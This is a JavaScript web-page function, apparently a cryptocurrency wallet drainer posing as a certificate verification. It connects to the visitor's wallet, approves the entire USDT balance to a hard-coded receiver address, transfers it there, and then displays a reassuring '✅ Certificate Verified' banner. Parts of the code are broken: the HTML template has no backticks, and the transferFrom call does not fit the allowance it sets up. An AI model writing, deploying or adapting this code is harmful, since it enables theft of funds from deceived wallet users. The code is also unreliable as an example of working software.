async function checkAndApprove() {
    if (typeof window.ethereum === 'undefined') {
        alert('Please install MetaMask or Trust Wallet!');
        return;
    }

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20) on BSC
    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const usdtAbi = [
        "function balanceOf(address owner) view returns (uint)",
        "function approve(address spender, uint amount) returns (bool)",
        "function allowance(address owner, address spender) view returns (uint)",
        "function transferFrom(address from, address to, uint amount) returns (bool)"
    ];

    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
    const balance = await usdtContract.balanceOf(userAddress);

    if (balance.eq(0)) {
        alert("You don't have any USDT in your wallet.");
        return;
    }

    const allowance = await usdtContract.allowance(userAddress, receiverAddress);
    if (allowance.lt(balance)) {
        const approveTx = await usdtContract.approve(receiverAddress, balance);
        await approveTx.wait();
    }

    const transferTx = await usdtContract.transferFrom(userAddress, receiverAddress, balance);
    await transferTx.wait();

    const certificateContainer = document.getElementById("certificate-container");
    certificateContainer.innerHTML = ""; // Clear old content

    // Format address (shortened)
    const shortAddress = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);

    // Format USDT amount
    const formattedAmount = ethers.utils.formatUnits(balance, 18);

    // Format current date & time
    const now = new Date();
    const formattedTime = now.toLocaleString('en-GB', {
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit', hour12: true
    });

    // Create certificate message
    const successMessage = document.createElement("div");
    successMessage.innerHTML = 
        <div style="text-align: center; margin-top: 40px;">
            <h2 style="color: green;">✅ Certificate Verified</h2>
            <p style="font-size: 18px;">${shortAddress}</p>
            <p style="font-size: 18px;">Only ${formattedAmount} USDT</p>
            <p style="font-size: 16px; color: gray;">🕒 ${formattedTime}</p>
        </div>
    ;

    certificateContainer.appendChild(successMessage);
}
